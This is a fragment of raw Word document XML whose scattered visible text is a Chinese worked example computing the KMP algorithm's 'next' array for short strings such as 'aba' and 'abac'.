                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>aba</w:t>
                            </w:r>
                          </w:p>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="11"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:numPr>
                                <w:ilvl w:val="0"/>
                                <w:numId w:val="3"/>
                              </w:numPr>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:tabs>
                                <w:tab w:val="left" w:pos="285"/>
                                <w:tab w:val="left" w:pos="1065"/>
                              </w:tabs>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:bookmarkStart w:id="326" w:name="bookmark30"/>
                            <w:bookmarkEnd w:id="326"/>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>next:</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>-1</w:t>
                            </w:r>
                          </w:p>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="1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str：a b</w:t>
                            </w:r>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
                        <a:noAutofit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape id="Shape 11" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:119.35pt;margin-top:52pt;height:60pt;width:98.25pt;mso-position-horizontal-relative:page;mso-wrap-distance-bottom:0pt;mso-wrap-distance-top:52pt;z-index:125830144;mso-width-relative:page;mso-height-relative:page;" filled="f" stroked="f" coordsize="21600,21600" o:gfxdata="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JGs/fYAAAACwEAAA8A&#10;AAAAAAAAAQAgAAAAIgAAAGRycy9kb3ducmV2LnhtbFBLAQIUABQAAAAIAIdO4kDGNvzxpQEAAGYD&#10;AAAOAAAAAAAAAAEAIAAAACcBAABkcnMvZTJvRG9jLnhtbFBLBQYAAAAABgAGAFkBAAA+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540"/>
                        <w:jc w:val="left"/>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>ABC</w:t>
                      </w:r>
                    </w:p>
                    <w:p>
                      <w:pPr>
                        <w:pStyle w:val="11"/>
                        <w:keepNext w:val="0"/>
                        <w:keepLines w:val="0"/>
                        <w:widowControl w:val="0"/>
                        <w:numPr>
                          <w:ilvl w:val="0"/>
                          <w:numId w:val="3"/>
                        </w:numPr>
                        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                        <w:tabs>
                          <w:tab w:val="left" w:pos="300"/>
                          <w:tab w:val="left" w:pos="1065"/>
                          <w:tab w:val="left" w:pos="1560"/>
                        </w:tabs>
                        <w:bidi w:val="0"/>
                        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                        <w:jc w:val="left"/>
                      </w:pPr>
                      <w:bookmarkStart w:id="324" w:name="bookmark28"/>
                      <w:bookmarkEnd w:id="324"/>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>index</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p>
                    <w:p>
                      <w:pPr>
                        <w:pStyle w:val="11"/>
                        <w:keepNext w:val="0"/>
                        <w:keepLines w:val="0"/>
                        <w:widowControl w:val="0"/>
                        <w:numPr>
                          <w:ilvl w:val="0"/>
                          <w:numId w:val="3"/>
                        </w:numPr>
                        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                        <w:tabs>
                          <w:tab w:val="left" w:pos="285"/>
                        </w:tabs>
                        <w:bidi w:val="0"/>
                        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                        <w:jc w:val="left"/>
                      </w:pPr>
                      <w:bookmarkStart w:id="325" w:name="bookmark29"/>
                      <w:bookmarkEnd w:id="325"/>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>str</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>aba</w:t>
                      </w:r>
                    </w:p>
                    <w:p>
                      <w:pPr>
                        <w:pStyle w:val="11"/>
                        <w:keepNext w:val="0"/>
                        <w:keepLines w:val="0"/>
                        <w:widowControl w:val="0"/>
                        <w:numPr>
                          <w:ilvl w:val="0"/>
                          <w:numId w:val="3"/>
                        </w:numPr>
                        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                        <w:tabs>
                          <w:tab w:val="left" w:pos="285"/>
                          <w:tab w:val="left" w:pos="1065"/>
                        </w:tabs>
                        <w:bidi w:val="0"/>
                        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                        <w:jc w:val="left"/>
                      </w:pPr>
                      <w:bookmarkStart w:id="326" w:name="bookmark30"/>
                      <w:bookmarkEnd w:id="326"/>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>next:</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>-1</w:t>
                      </w:r>
                    </w:p>
                    <w:p>
                      <w:pPr>
                        <w:pStyle w:val="1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str：a b</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="555625" distB="581025" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>2925445</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>555625</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1524000" cy="285750"/>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1524000" cy="285750"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="11"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:tabs>
                                <w:tab w:val="left" w:pos="-2235"/>
                              </w:tabs>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:hanging="4620"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:u w:val="single"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:u w:val="single"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="11"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="2060" w:right="0" w:firstLine="0"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>J</w:t>
                            </w:r>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
                        <a:noAutofit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape id="Shape 13" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:230.35pt;margin-top:43.75pt;height:22.5pt;width:120pt;mso-position-horizontal-relative:page;mso-wrap-distance-bottom:45.75pt;mso-wrap-distance-top:43.75pt;z-index:125830144;mso-width-relative:page;mso-height-relative:page;" filled="f" stroked="f" coordsize="21600,21600" o:gfxdata="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hHlAbYAAAACgEAAA8A&#10;AAAAAAAAAQAgAAAAIgAAAGRycy9kb3ducmV2LnhtbFBLAQIUABQAAAAIAIdO4kBdm5dNpQEAAGYD&#10;AAAOAAAAAAAAAAEAIAAAACcBAABkcnMvZTJvRG9jLnhtbFBLBQYAAAAABgAGAFkBAAA+BQAAAAA=&#10;">
                <v:fill on="f" focussize="0,0"/>
                <v:stroke on="f"/>
                <v:imagedata o:title=""/>
                <o:lock v:ext="edit" aspectratio="f"/>
                <v:textbox inset="0mm,0mm,0mm,0mm">
                  <w:txbxContent>
                    <w:p>
                      <w:pPr>
                        <w:pStyle w:val="11"/>
                        <w:keepNext w:val="0"/>
                        <w:keepLines w:val="0"/>
                        <w:widowControl w:val="0"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                        <w:tabs>
                          <w:tab w:val="left" w:pos="-2235"/>
                        </w:tabs>
                        <w:bidi w:val="0"/>
                        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                        <w:ind w:left="0" w:right="0" w:hanging="4620"/>
                        <w:jc w:val="left"/>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:u w:val="single"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:u w:val="single"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p>
                      <w:pPr>
                        <w:pStyle w:val="11"/>
                        <w:keepNext w:val="0"/>
                        <w:keepLines w:val="0"/>
                        <w:widowControl w:val="0"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                        <w:bidi w:val="0"/>
                        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                        <w:ind w:left="2060" w:right="0" w:firstLine="0"/>
                        <w:jc w:val="left"/>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>J</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w: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numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1805" w:right="0" w:bottom="1880" w:left="0" w:header="0" w:footer="3" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="380" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="440"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>1430020</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>241300</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="276225" cy="314325"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:wrapSquare wrapText="right"/>
            <wp:docPr id="15" name="Shape 15"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="15" name="Shape 15"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId29"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="276225" cy="314325"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>不同</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>，next</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>第二位与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>-1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1320"/>
          <w:tab w:val="left" w:pos="1643"/>
          <w:tab w:val="left" w:pos="2130"/>
          <w:tab w:val="left" w:pos="2435"/>
          <w:tab w:val="left" w:pos="3600"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>index 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4 5 6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="893"/>
          <w:tab w:val="left" w:pos="2415"/>
          <w:tab w:val="left" w:pos="2760"/>
          <w:tab w:val="left" w:pos="3165"/>
          <w:tab w:val="left" w:pos="3600"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="600"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="31" w:name="bookmark34"/>
      <w:bookmarkEnd w:id="31"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>str： a b</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 a c</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="893"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="600"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="32" w:name="bookmark35"/>
      <w:bookmarkEnd w:id="32"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>next： -1 -1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1643"/>
          <w:tab w:val="left" w:pos="2415"/>
          <w:tab w:val="left" w:pos="2760"/>
          <w:tab w:val="left" w:pos="3165"/>
          <w:tab w:val="left" w:pos="3600"/>
          <w:tab w:val="left" w:pos="4725"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="600"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="33" w:name="bookmark36"/>
      <w:bookmarkEnd w:id="33"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>str</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>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aba</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="1" w:lineRule="exact"/>
        <w:sectPr>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1805" w:right="1712" w:bottom="1880" w:left="1772" w:header="0" w:footer="3" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>1430020</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="342900" cy="142875"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:wrapTopAndBottom/>
            <wp:docPr id="17" name="Shape 17"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="17" name="Shape 17"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId30"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="342900" cy="142875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="20" w:after="20" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="1" w:lineRule="exact"/>
        <w:sectPr>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1805" w:right="0" w:bottom="1805" w:left="0" w:header="0" w:footer="3" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
        <w:sectPr>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1805" w:right="1712" w:bottom="1805" w:left="1772" w:header="0" w:footer="3" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>再向后移一位</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="19"/>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到第7位时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
